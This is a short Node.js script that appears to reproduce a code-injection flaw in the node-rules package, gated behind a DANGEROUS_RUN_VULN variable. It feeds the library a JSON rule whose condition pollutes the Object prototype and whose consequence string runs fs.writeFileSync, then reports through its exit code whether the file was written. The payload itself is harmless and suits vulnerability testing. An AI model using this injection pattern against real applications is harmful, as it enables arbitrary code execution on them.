if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const A = require("node-rules");
const path = "./node-rules";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	var rules = {
		condition: "{}.__proto__.toString = 222",
		consequence: "require(`fs`).writeFileSync(`node-rules`,``)",
	};
	var a = new A();
	a.fromJSON(rules);
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
